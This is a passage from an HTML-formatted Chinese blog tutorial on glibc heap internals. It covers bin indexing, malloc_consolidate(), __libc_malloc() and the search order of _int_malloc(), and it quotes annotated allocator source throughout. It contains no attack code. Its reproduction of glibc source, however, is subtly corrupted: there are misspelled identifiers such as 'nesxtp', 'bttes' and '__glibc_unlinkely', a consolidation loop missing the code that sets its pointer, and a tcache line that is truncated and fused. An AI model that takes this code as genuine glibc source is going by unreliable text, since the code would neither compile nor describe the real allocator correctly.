class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// 根据 chunk 大小获得其在 bins 中的索引</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> bin_index(sz)\t\t\t\\</span></span><br><span class=\"line\"><span class=\"meta\">\t((in_smallbin_range (sz)) ? smallbin_index (sz) : largebin_index (sz))</span></span><br></pre></td></tr></table></figure>\n<p>​\t获得 unsorted bin 。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> unsorted_chunk(M)\t\t(bin_at (M,1))</span></span><br></pre></td></tr></table></figure>\n<p>​\tbinmap 结构在索引 bin 的时候使用，binmap 为 malloc_state 的成员，其中一个比特位表示 bins 中相应的 bin 状态，1 表示 bin 不为空，0 表示为空，这样能加快搜索速度。</p>\n<h2 id=\"3malloc_consolidate函数\"><a class=\"markdownIt-Anchor\" href=\"#3malloc_consolidate函数\">#</a> 3.malloc_consolidate () 函数：</h2>\n<p>​\t由于 fast bin 中的 chunk 永远不会释放，导致相邻的 free chunk 无法与之合并，从而造成了大量的内存碎片，malloc_consolidate () 函数主要功能就是来解决这个问题。在达到某些条件时，glibc 就会调用该函数将  fast bin 中的 chunk 取出来，与相邻的 free chunk 合并之后放入 unsorted bin ，或者与 top chunk 合并后形成新的 top chunk 。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">static</span> <span class=\"type\">void</span> <span class=\"title function_\">malloc_consolidate</span><span class=\"params\">(mstate av)</span> &#123;</span><br><span class=\"line\">    mfastbinptr* fb;\t\t\t\t\t<span class=\"comment\">/* current fastbin being consolidated */</span></span><br><span class=\"line\">    mfastbinptr* maxfb;\t\t\t\t\t<span class=\"comment\">/* last fastbin (for loop control) */</span></span><br><span class=\"line\">    mchunkptr \t p;\t\t\t\t\t\t<span class=\"comment\">/* current chunk being consolidated */</span></span><br><span class=\"line\">    mchunkptr    nextp;\t\t\t\t\t<span class=\"comment\">/* next chunk to consolidate */</span></span><br><span class=\"line\">    mchunkptr \t unsorted_bin;\t\t\t<span class=\"comment\">/* bin header */</span></span><br><span class=\"line\">    mchunkptr \t first_unsorted;\t\t<span class=\"comment\">/* chunk to link to */</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    mchunkptr\t\t\tnextchunk;</span><br><span class=\"line\">    INTERNAL_SIZE_T\t\tsize;</span><br><span class=\"line\">    INTERNAL_SIZE_T\t\tnextsize;</span><br><span class=\"line\">    INTERNAL_SIZE_T\t\tprevsize;</span><br><span class=\"line\">    <span class=\"type\">int</span>\t\t\t\t\tnextinuse;</span><br><span class=\"line\">    mchunkptr\t\t\tbck;</span><br><span class=\"line\">    mchunkptr\t\t\tfwd;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">/* 如果 max_fast 为0，就调用 malloc_init_state() 函数对 av 进行初始化 */</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (get_max_fast() != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// 清楚 av-&gt;flags 有关 fast bin 的标志位，表示所有 fast bin 都为空</span></span><br><span class=\"line\">        clear_fastchunks(av);</span><br><span class=\"line\">        </span><br><span class=\"line\">        unsorted_bin = unsorted_chunk(av);</span><br><span class=\"line\">        </span><br><span class=\"line\">        <span class=\"comment\">/* J将 fast bin 中的 chunk 移除并合并，然后放入 unsorted bin */</span></span><br><span class=\"line\">        maxfb = &amp;fastbin(av,NFASTBINS - <span class=\"number\">1</span>);</span><br><span class=\"line\">        fb = &amp;fastbin(av,<span class=\"number\">0</span>);</span><br><span class=\"line\">        <span class=\"keyword\">do</span> &#123;\t\t\t\t\t<span class=\"comment\">// 内层循环遍历 fast bin 中的每一个 chunk</span></span><br><span class=\"line\">            check_inuse_chunk(av,p);</span><br><span class=\"line\">            nextp = p-&gt;fd;</span><br><span class=\"line\">            </span><br><span class=\"line\">            size = p-&gt;size &amp; ~(PREV_INUSE|NON_MAIN_ARENA);</span><br><span class=\"line\">            nextchunk = chunk_at_offset(p,size);</span><br><span class=\"line\">            nextsize = chunksize(nextchunk);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!prev_inuse(p)) &#123;</span><br><span class=\"line\">                prevsize = p-&gt;prev_size;</span><br><span class=\"line\">                size += prevsize;</span><br><span class=\"line\">                p = chunk_at_offset(p,-((<span class=\"type\">long</span>) prevsize));</span><br><span class=\"line\">                unlink(av,p,bck,fwd);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"comment\">// 如果下一个 chunk 不是 top chunk ，向前合并，并加入 unsorted bin</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (nextchunk != av-&gt;top) &#123;</span><br><span class=\"line\">                nextinuse = inuse_bit_at_offset(nextchunk,nextsize);</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (!nextinuse) &#123;</span><br><span class=\"line\">                    size += nextsize;</span><br><span class=\"line\">                    unlink(av,nextchunk,bck,fwd);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">else</span></span><br><span class=\"line\">                    clear_inuse_bit_at_offset(nextchunk,<span class=\"number\">0</span>);</span><br><span class=\"line\">                </span><br><span class=\"line\">                first_unsorted = unsorted_bin-&gt;fd;</span><br><span class=\"line\">                unsorted_bin-&gt;fd = p;</span><br><span class=\"line\">                first_unsorted-&gt;bk = p;</span><br><span class=\"line\">                </span><br><span class=\"line\">                <span class=\"keyword\">if</span> (!in_smallbin_range (size)) &#123;</span><br><span class=\"line\">                    p-&gt;fd_nextsize = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">                    p-&gt;bk_nextsize = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                </span><br><span class=\"line\">                set_head(p,size | PREV_INUSE);</span><br><span class=\"line\">                p-&gt;bk = unsorted_bin;</span><br><span class=\"line\">                p-&gt;fd = first_unsorted;</span><br><span class=\"line\">                set_foot(p,size);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">else</span> &#123;\t\t<span class=\"comment\">// 如果下一个 chunk 是 top chunk，和 top chunk 合并，形成新的 top chunk</span></span><br><span class=\"line\">                size += nextsize;</span><br><span class=\"line\">                set_head(p,size | PREV_INUSE);</span><br><span class=\"line\">                av-&gt;top = p;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">while</span> ( (p = nesxtp) != <span class=\"number\">0</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        malloc_init_state(av);\t\t<span class=\"comment\">// malloc 初始化</span></span><br><span class=\"line\">        check_malloc_state(av);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"4-malloc-相关源码\"><a class=\"markdownIt-Anchor\" href=\"#4-malloc-相关源码\">#</a> 4. malloc () 相关源码：</h2>\n<h3 id=\"__libc_malloc\"><a class=\"markdownIt-Anchor\" href=\"#__libc_malloc\">#</a> __libc_malloc()：</h3>\n<p>​\t因为使用了宏 strong_alias (__libc_malloc,malloc)，在 libc 源码中 malloc () 函数实际上是 __libc_malloc ()，定义如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> * __libc_malloc (<span class=\"type\">size_t</span> bytes) &#123;</span><br><span class=\"line\">    mstate ar_ptr;</span><br><span class=\"line\">    <span class=\"type\">void</span> *victim;</span><br><span class=\"line\">    <span class=\"comment\">// 读取 __malloc_hook 钩子，如果有钩子，则运行钩子函数并返回</span></span><br><span class=\"line\">    <span class=\"type\">void</span> *(*hook) (<span class=\"type\">size_t</span>,<span class=\"type\">const</span> <span class=\"type\">void</span> *)</span><br><span class=\"line\">        = atomic_forced_read (__malloc_hook);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (__builtin_expect (hook != <span class=\"literal\">NULL</span>,<span class=\"number\">0</span>))</span><br><span class=\"line\">        <span class=\"keyword\">return</span> (*hook)(bytes,RETURN_ADDRESS (<span class=\"number\">0</span>));</span><br><span class=\"line\">    </span><br><span class=\"line\">    arena_get (ar_ptr,bytes);\t\t\t\t<span class=\"comment\">// 寻找一个合适的 arena 来分配内存。</span></span><br><span class=\"line\">    victim = _int_malloc (ar_ptr,bytes);\t<span class=\"comment\">// 尝试调用 _int_malloc() 分配内存</span></span><br><span class=\"line\">    <span class=\"comment\">//  如果没有找到合适的内存，就尝试找一个可用的 arena (前提是 ar_pter != NULL)</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (!victim &amp;&amp; ar_ptr != <span class=\"literal\">NULL</span>) &#123;</span><br><span class=\"line\">        LIBC_PROBE (memory_malloc_retry,<span class=\"number\">1</span>,bytes);</span><br><span class=\"line\">        ar_ptr = arena_get_retry (ar_ptr,bttes);</span><br><span class=\"line\">        victim = _int_malloc (ar_ptr,bytes);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span> (ar_ptr != <span class=\"literal\">NULL</span>)\t\t\t\t<span class=\"comment\">// 如果申请了 arena ，还需要解锁该 arena</span></span><br><span class=\"line\">        (<span class=\"type\">void</span>) mutex_unlock (&amp;ar_ptr-&gt;mutex);</span><br><span class=\"line\">    </span><br><span class=\"line\">    assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||</span><br><span class=\"line\">           ar_ptr == arena_for_chunk (mem2chunk (victim)));</span><br><span class=\"line\">    <span class=\"keyword\">return</span> victim;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h3 id=\"_int_malloc\"><a class=\"markdownIt-Anchor\" href=\"#_int_malloc\">#</a> _int_malloc()：</h3>\n<p>​\t_int_malloc () 是内存分配的核心函数，为了以最快的速度找到最合适的堆块，glibc 根据申请堆块的大、各个 bin 的状态仔细地安排了分配顺序和内存整理地时机。其大概搜索顺序是：</p>\n<blockquote>\n<ol>\n<li>fast bin （寻找大小完全一样的）</li>\n<li>small bin （寻找大小完全一样的）</li>\n<li>unsorted bin （寻找大小完全一样的）</li>\n<li>large bin （如果申请较大的是 chunk ，寻找最小能满足地）</li>\n<li>bins （寻找最小能满足的）</li>\n<li>top chunk （切分出合适的 chunk ）</li>\n<li>系统函数分配。</li>\n</ol>\n</blockquote>\n<p>​\t_int_malloc () 函数具体过程如下。</p>\n<p>（1）首先定义一些列所需的变量，并将用户请求的 bytes 转化为表示 chunk 大小的 nb 。如果没有合适的 arena ，就调用 sysmalloc () ，用 mmap () 分配 chunk 并返回。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (__glibc_unlinkely (av == <span class=\"literal\">NULL</span>))&#123;</span><br><span class=\"line\">    <span class=\"type\">void</span> *p = sysmalloc (nb,av);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (p != <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">        alloc_perturb (p,bytes);</span><br><span class=\"line\">    <span class=\"keyword\">return</span> p;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t（2）其次，检查 fast bin 中是否有合适的 chunk 。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//如果 nb 在 fast bin 范围内，就通过 fast bin 分配，这段代码可以在初始化之前运行</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> ((<span class=\"type\">unsigned</span> <span class=\"type\">long</span>) (nb) &lt;= (<span class=\"type\">unsigned</span> <span class=\"type\">long</span>) (get_max_fast())) &#123;</span><br><span class=\"line\">    <span class=\"comment\">//根据 nb 找合适的 fast bin ，fb 是指向对应 fast bin 的指针</span></span><br><span class=\"line\">    idx = fastbin_index (nb);</span><br><span class=\"line\">    mfastbinptr *fb = &amp;fastbin (av,idx);</span><br><span class=\"line\">    mchunkptr pp = *fb;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">do</span> &#123;\t<span class=\"comment\">//如果 fast bin 中有 chunk ，就将其按 LIFO 的规则取出，如果没有则跳过</span></span><br><span class=\"line\">        victim = pp;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (victim == <span class=\"literal\">NULL</span>)</span><br><span class=\"line\">            <span class=\"keyword\">break</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> ((pp = catomic_compare_and_exchange_val_acq (fb,victim-&gt;fd,victim))</span><br><span class=\"line\">          != victim);</span><br><span class=\"line\">    <span class=\"comment\">//如果 victim != NULL ，则说明找到了合适的 chunk 没检查后将其返给用户</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (victim != <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        <span class=\"comment\">//检查此 chunk 大小是否应在 fast bin 中，防止伪造</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (__builtin_expect (fastbin_index (chunksize (victim)) != idx,<span class=\"number\">0</span>)) &#123;</span><br><span class=\"line\">            errstr = <span class=\"string\">&quot;malloc():memory corruption (fast)&quot;</span>;</span><br><span class=\"line\">            errout:</span><br><span class=\"line\">            malloc_printerr (check_action,errstr,chunk2mem (victim),av);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        check_remalloced_chunk (av,victim,nb);</span><br><span class=\"line\">        <span class=\"type\">void</span> *p = chunk2mem (victim);</span><br><span class=\"line\">        alloc_perturb (p,bytes);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> p;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t（3）然后，检查 small bin 中是否有合适的 chunk。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">  <span class=\"keyword\">if</span> (in_smallbin_range (nb))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      idx = smallbin_index (nb);</span><br><span class=\"line\">      bin = bin_at (av, idx);</span><br><span class=\"line\"></span><br><span class=\"line\">      <span class=\"keyword\">if</span> ((victim = last (bin)) != bin)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">          bck = victim-&gt;bk;</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (__glibc_unlikely (bck-&gt;fd != victim)) <span class=\"comment\">//类似unlink检查</span></span><br><span class=\"line\">            malloc_printerr (<span class=\"string\">&quot;malloc(): smallbin double linked list corrupted&quot;</span>);</span><br><span class=\"line\">          set_inuse_bit_at_offset (victim, nb);</span><br><span class=\"line\">          bin-&gt;bk = bck;</span><br><span class=\"line\">          bck-&gt;fd = bin;</span><br><span class=\"line\"></span><br><span class=\"line\">          <span class=\"keyword\">if</span> (av != &amp;main_arena)</span><br><span class=\"line\">            set_non_main_arena (victim);</span><br><span class=\"line\">          check_malloced_chunk (av, victim, nb);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> USE_TCACHE</span></span><br><span class=\"line\">          <span class=\"comment\">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class=\"line\"><span class=\"comment\">             stash them in the tcache.  */</span></span><br><span class=\"line\">          <span class=\"type\">size_t</span> tc_idx = csize2tidx (nb);</span><br><span class=\"line\">          <span class=\"keyword\">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              mchunkptr tc_victim;</span><br><span class=\"line\"></span><br><span class=\"line\">              <span class=\"comment\">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class=\"line\">              <span class=\"keyword\">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class=\"line\">                     &amp;&amp; (tc_victim = last (bin)) != bin)</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                  <span class=\"keyword\">if</span> (tc_victim != <span class=\"number\">0</span>)</span><br><span class=\"line\">                    &#123;</span><br><span class=\"line\">                      bck = tc_victim-&gt;bk;</span><br><span class=\"line\">                      set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class=\"line\">                      <span class=\"keyword\">if</span> (av != &amp;main_arena)</span><br><span class=\"line\">                        set_non_main_arena (tc_victim);</span><br><span class=\"line\">                      bin-&gt;bk = bck;</span><br><span class=\"line\">                      bck-&gt;fd = bin;</span><br><span class=\"line\"></span><br><span class=\"line\">                      tcach                   &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span></span></span><br><span class=\"line\">          <span class=\"type\">void</span> *p = chunk2mem (victim);</span><br><span class=\"line\">          alloc_perturb (p, bytes);</span><br><span class=\"line\">          <span class=\"keyword\">return</span> p;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>​\t（4）此后，整理 fast bin ，计算 large bin 的 index。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//到这里还不能满足，就调用 malloc_consolidate() 整理 fastbins ，或许就会有合适的 chunk </span></span><br><span class=\"line\"><span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    idx = largebin_index (nb);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (have_fastchunks (av))</span><br><span class=\"line\">        malloc_consolidate (av);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t（5）接下来，函数进入一个大的外层循环 for 循环，包含了 _int_malloc () 函数之后的所有进程。紧接着是内层第一个 while 循环，它会遍历 unsorted bin 中的每一个 chunk ，如果大小正好合适，就将其取出，否则就将其放入 small bin 或者 large bin。这是唯一的将 chunk 放进 small bin 或者 large bin 的过程。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">for</span> (;; ) &#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> iters = <span class=\"number\">0</span>;</span><br><span class=\"line\">    <span class=\"keyword\">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunk (av)) &#123;</span><br><span class=\"line\">        bck = victim-&gt;bk;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class=\"number\">2</span> * SIZE_SZ ,<span class=\"number\">0</span>)</span><br><span class=\"line\">           || __builtin_expect (victim-&gt;size &gt;&gt; av-&gt;system_mem,<span class=\"number\">0</span>))</span><br><span class=\"line\">            malloc_printerr (check_action,<span class=\"string\">&quot;malloc():memory corruption&quot;</span>,</span><br><span class=\"line\">                             chunk2mem (victim),av);</span><br><span class=\"line\">        size = chunksize (victim);</span><br></pre></td></tr></table></figure>\n<p>​\t（6）在内层第一个循环内部，当请求的 chunk 属于 small bin 、 unsorted bin 只有一个 chunk 为 last remainder 并且满足拆分条件时，就将其拆分。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class=\"line\">              bck == unsorted_chunks (av) &amp;&amp;</span><br><span class=\"line\">              victim == av-&gt;last_remainder &amp;&amp;</span><br><span class=\"line\">              (<span class=\"type\">unsigned</span> <span class=\"type\">long</span>) (size) &gt; (<span class=\"type\">unsigned</span> <span class=\"type\">long</span>) (nb + MINSIZE))</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              <span class=\"comment\">/* split and reattach remainder */</span></span><br><span class=\"line\">              remainder_size = size - nb;</span><br><span class=\"line\">              remainder = chunk_at_offset (victim, nb);</span><br><span class=\"line\">              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class=\"line\">              av-&gt;last_remainder = remainder;</span><br><span class=\"line\">              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class=\"line\">              <span class=\"keyword\">if</span> (!in_smallbin_range (remainder_size))</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                  remainder-&gt;fd_nextsize = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">                  remainder-&gt;bk_nextsize = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">              set_head (victim, nb | PREV_INUSE |</span><br><span class=\"line\">                        (av != &amp;main_arena ? NON_MAIN_ARENA : <span class=\"number\">0</span>));</span><br><span class=\"line\">              set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class=\"line\">                            set_foot (remainder, remainder_size);</span><br><span class=\"line\"></span><br><span class=\"line\">              check_malloced_chunk (av, victim, nb);</span><br><span class=\"line\">              <span class=\"type\">void</span> *p = chunk2mem (victim);</span><br><span class=\"line\">              alloc_perturb (p, bytes);</span><br><span class=\"line\">              <span class=\"keyword\">return</span> p;</span><br><span class=\"line\">            &#125;</span><br></pre></td></tr></table></figure>\n<p>​\t（7）接着，将 chunk 从 unsorted bin 中移除，如果大小正合适，就将其返回给用户。</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class=\"line\">            malloc_printerr (<span class=\"string\">&quot;malloc(): corrupted unsorted chunks 3&quot;</span>);</span><br><span class=\"line\">          unsorted_chunks (av)-&gt;bk = bck;</span><br><span class=\"line\">          bck-&gt;fd = unsorted_chunks (av);</span><br><span class=\"line\"></span><br><span class=\"line\">          <span class=\"comment\">/* Take now instead of binning if exact fit */</span></span><br><span class=\"line\"></span><br><span class=\"line\">          <span class=\"keyword\">if</span> (size == nb)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">              set_inuse_bit_at_offset (victim, size);</span><br><span class=\"line\">              <span class=\"keyword\">if</span> (av != &amp;main_arena)</span><br><span class=\"line\">                set_non_main_arena (victim);</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">if</span> USE_TCACHE</span></span><br><span class=\"line\">              <span class=\"comment\">/* Fill 